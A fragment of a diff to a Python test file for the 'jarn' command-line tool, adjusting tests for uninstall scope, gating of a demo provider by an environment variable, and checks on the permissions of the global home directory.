+    """Explicit global categories never enumerate project-local .jarn directories.
 
     The implementation must remove ONLY paths.global_home() and never enumerate
     or touch project-local .jarn/ directories that live under a project root.
@@ -963,7 +1341,7 @@ def test_uninstall_spares_projects(tmp_path, monkeypatch):
     monkeypatch.setattr(paths, "global_home", lambda: fake_home)
     monkeypatch.setattr(keyring, "delete_password", lambda s, a: None)
 
-    assert main(["uninstall", "--yes"]) == 0
+    assert main(["uninstall", "--yes", "--config"]) == 0
 
     # Global home removed.
     assert not fake_home.exists(), "global home was not removed"
@@ -1079,16 +1457,12 @@ def test_demo_provider_gated(monkeypatch):
     # --- JARN_DEMO=1: canned provider is available ---
     monkeypatch.setenv("JARN_DEMO", "1")
     cfg = demo_provider_config()
-    assert cfg is not None, (
-        "demo_provider_config() must return a ProviderConfig when JARN_DEMO=1"
-    )
+    assert cfg is not None, "demo_provider_config() must return a ProviderConfig when JARN_DEMO=1"
 
     # --- env unset: canned provider must not be available ---
     monkeypatch.delenv("JARN_DEMO", raising=False)
     cfg_unset = demo_provider_config()
-    assert cfg_unset is None, (
-        "demo_provider_config() must return None when JARN_DEMO is not set"
-    )
+    assert cfg_unset is None, "demo_provider_config() must return None when JARN_DEMO is not set"
 
     # The demo profile must never appear in the normal DEFAULT_MODELS registry,
     # so it cannot accidentally become the default for any provider resolution.
@@ -1115,7 +1489,7 @@ def test_doctor_reports_a_world_readable_global_home(tmp_path, monkeypatch, caps
         yaml.safe_dump(
             {
                 "default_profile": "openrouter",
-                "providers": {"openrouter": {"type": "openrouter", "api_key": "sk-test"}},
+                "providers": {"openrouter": {"type": "openrouter"}},
             }
         ),
         encoding="utf-8",
@@ -1143,7 +1517,7 @@ def test_doctor_is_quiet_about_a_correctly_locked_home(tmp_path, monkeypatch, ca
         yaml.safe_dump(
             {
                 "default_profile": "openrouter",
-                "providers": {"openrouter": {"type": "openrouter", "api_key": "sk-test"}},
+                "providers": {"openrouter": {"type": "openrouter"}},
             }
         ),
         encoding="utf-8",
